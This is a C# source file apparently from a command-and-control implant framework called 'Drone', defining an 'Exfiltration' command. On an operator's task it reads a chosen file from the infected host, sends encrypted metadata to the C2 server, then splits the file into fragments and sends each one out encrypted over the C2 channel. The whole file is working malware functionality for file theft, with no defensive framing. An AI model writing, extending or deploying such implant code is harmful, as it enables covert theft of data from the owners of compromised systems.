using System.Net.Http;
using System;
using System.Threading;
using System.Threading.Tasks;

using Drone.CommModules;
using System.IO;
using System.Security.Policy;

namespace Drone.Commands;

public sealed class Exfiltration : DroneCommand
{
    public override byte Command => 0x20;
    public override bool Threaded => true;
    
    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        
        var filePath = task.Arguments["filepath"];
        var fragmentSize = int.Parse(task.Arguments["fragmentSize"]);
        //send how many fragments will be sent 
        FileInfo fileInfo = new FileInfo(filePath);
        var exfiltrateMetadata = new ExfilrateMetadata()
        {
            TaskId = task.Id,
            FileFullPath = filePath,
            Size = fileInfo.Length
        };
        await Drone.SendC2Frame(new C2Frame()
        {
            DroneId = Drone._metadata.Id,
            Type = FrameType.EXFILTRATION_METADATA,
            Data = Crypto.Encrypt(exfiltrateMetadata)
        });
        var data = File.ReadAllBytes(filePath);
        var fragmentedData = CreateFragmentedFile(data, fragmentSize);
        foreach (var (contentRangeValue, content) in fragmentedData)
        {
            var fragmentMetadata = new FragmentMetadata()
            {
                TaskId = task.Id,
                ContentRange = contentRangeValue,
                Content = content
            };
            await Drone.SendC2Frame(new C2Frame()
            {
                DroneId = Drone._metadata.Id,
                Type = FrameType.EXFILTRATION_FRAGMENT,
                Data = Crypto.Encrypt(fragmentMetadata)
            });
        }

    }
   
    private (string, byte[])[] CreateFragmentedFile(byte[] requestData, int fragmentSize)
    {
        int totalFragments = (int)Math.Ceiling((double)requestData.Length / fragmentSize);
        var requests = new (string, byte[])[totalFragments];

        for (int i = 0; i < totalFragments; i++)
        {
            int offset = i * fragmentSize;
            int length = Math.Min(fragmentSize, requestData.Length - offset);

            byte[] fragmentData = new byte[length];
            Array.Copy(requestData, offset, fragmentData, 0, length);

            var content = (fragmentData);

            // Calculate the range for the current fragment
            long rangeStart = offset;
            long rangeEnd = offset + length - 1;

            // Create the value for the Content-Range header
            string contentRangeValue = $"bytes {rangeStart}-{rangeEnd}/{requestData.Length}";

            requests[i] = (contentRangeValue, content);
        }

        return requests;
    }
}